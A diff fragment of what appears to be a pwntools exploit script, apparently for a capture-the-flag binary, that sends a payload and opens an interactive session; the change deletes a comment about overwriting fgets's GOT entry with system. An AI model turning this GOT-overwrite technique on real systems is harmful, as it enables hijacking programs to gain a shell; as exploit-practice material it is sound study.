@@ -16,7 +16,6 @@ p.sendlineafter('>', '1')
 p.recvline()
 p.sendline(payload)
 
-#write fgets_got to system
 
 p.interactive()
 p.close()
